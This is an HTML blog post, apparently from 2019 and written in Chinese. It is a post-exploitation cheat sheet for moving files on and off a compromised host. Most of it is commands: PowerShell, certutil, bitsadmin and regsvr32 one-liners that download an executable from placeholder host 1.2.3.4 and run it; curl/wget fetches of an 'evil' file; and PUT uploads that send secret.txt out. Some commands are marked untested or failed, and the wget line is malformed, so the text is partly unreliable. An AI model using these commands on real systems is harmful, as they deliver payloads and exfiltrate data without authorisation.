@@ -1,0 +1,91 @@
+<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>后渗透测试-文件传输技巧 - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="/uploads/background.JPG"><div class="post-title"><h1 class="title">后渗透测试-文件传输技巧</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>7 Minutes</li><li><i class="icon icon-calendar"></i>December 31, 2019</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="后渗透测试中的文件传输技巧"><a href="#后渗透测试中的文件传输技巧" class="headerlink" title="后渗透测试中的文件传输技巧"></a><center>后渗透测试中的文件传输技巧</center></h2><h3 id="搭建-HTTP-Server"><a href="#搭建-HTTP-Server" class="headerlink" title="搭建 HTTP Server"></a>搭建 HTTP Server</h3><ul>
+<li><p>python2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python2 -m SimpleHTTPServer 1337</span><br></pre></td></tr></table></figure>
+
+<p>在当前目录启动 HTTP 服务，端口为 1337。</p>
+</li>
+<li><p>python3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server 1337</span><br></pre></td></tr></table></figure>
+
+<p>同上。</p>
+</li>
+<li><p>PHP 5.4+</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 利用 php 在当前目录启动 HTTP 服务</span><br><span class="line">php -S 0.0.0.0:1377</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Ruby</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ruby -rwebrick -e&apos;WEBrick::HTTPServer.new(:Port =&gt; 1337, :DocumentRoot =&gt; Dir.pwd).start&apos;</span><br></pre></td></tr></table></figure>
+
+<p>Ruby 1.9.2+</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ruby -run -e httpd . -p 1337</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Perl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">perl -MHTTP::Server::Brick -e &apos;$s=HTTP::Server::Brick-&gt;new(port=&gt;1337); $s-&gt;mount(&quot;/&quot;=&gt;&#123;path=&gt;&quot;.&quot;&#125;); $s-&gt;start&apos;</span><br><span class="line">perl -MIO::All -e &apos;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub &#123; $_[0] &lt; io(-x $1 +? &quot;./$1 |&quot; : $1) if /^GET \/(.*) / &#125;)&apos;</span><br></pre></td></tr></table></figure>
+
+<p>注：这里需要搭建组件，未测试</p>
+</li>
+<li><p>busybox http</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ busybox httpd -f -p 8000</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="从-HTTP-Server-下载文件"><a href="#从-HTTP-Server-下载文件" class="headerlink" title="从 HTTP Server 下载文件"></a>从 HTTP Server 下载文件</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul>
+<li><p>powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 下载并执行</span><br><span class="line">c:\&gt; powershell (new-object System.Net.WebClient).DownloadFile(&apos;http://1.2.3.4/5.exe&apos;,&apos;c:\download\a.exe&apos;);start-process &apos;c:\download\a.exe&apos;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>certutil</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 下载并执行</span><br><span class="line">// 最好先清理一下缓存</span><br><span class="line">c:\&gt; certutil -urlcache delete</span><br><span class="line"></span><br><span class="line">c:\&gt; certutil -urlcache -split -f http://1.2.3.4/5.exe &gt; c:\download\a.exe &amp;&amp; c:\download\a.exe</span><br></pre></td></tr></table></figure>
+
+<p>注：经过测试，可以下载文件，但是无法执行，提示文件过大无法载入内存，初步怀疑是文件中覆盖了 url 垃圾缓存。</p>
+</li>
+<li><p>bitsadmin</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// bitsadmin 下载速度较慢</span><br><span class="line"></span><br><span class="line">c:\&gt; bitsadmin /transfer n http://1.2.3.4/a.exe &gt; c:\a.exe &amp;&amp; c:\a.exe</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>regsvr32</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt; regsvr32 /u /s /i:http://1.2.3.4/5.exe scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p>注：测试失败。</p>
+</li>
+</ul>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ul>
+<li><p>curl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl &quot;http://1.2.3.4/evil&quot; -o /root/evil</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>wget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget &quot;http://1.2.3.4.evil&quot; -o /root/evil</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="上传文件到-HTTP-PUT-Server"><a href="#上传文件到-HTTP-PUT-Server" class="headerlink" title="上传文件到 HTTP PUT Server"></a>上传文件到 HTTP PUT Server</h3><h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><ul>
+<li><p>powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$body = Get-Content secret.txt Invoke-RestMethod -Uri http://ip:port/secret.txt -Method PUT -Body $body</span><br></pre></td></tr></table></figure>
+
+<p>注：测试失败。</p>
+</li>
+</ul>
+<h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><ul>
+<li><p>curl</p>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --upload-file ./a.php http://ip:port/a.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>wget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget --method=PUT --post-file=./a.php http://ip:port/a.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+</li>
+</ul>
+</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck4t9ev4y0009g2ozzp872zd1" data-title="后渗透测试-文件传输技巧" data-url="http://yoursite.com/2019/12/31/后渗透测试-文件传输技巧/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
+var duoshuoQuery = {short_name: siteName};
+(function() {
+  var ds = document.createElement('script');
+  ds.type = 'text/javascript';ds.async = true;
+  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+  ds.charset = 'UTF-8';
+  (document.getElementsByTagName('head')[0] 
+  || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2019/12/31/内网渗透/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2019/12/06/未授权访问漏洞/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="https://www.baidu.com" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2019 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
+window.onload = function () {
+  wrap.className += ' done';
+}</script></body></html>
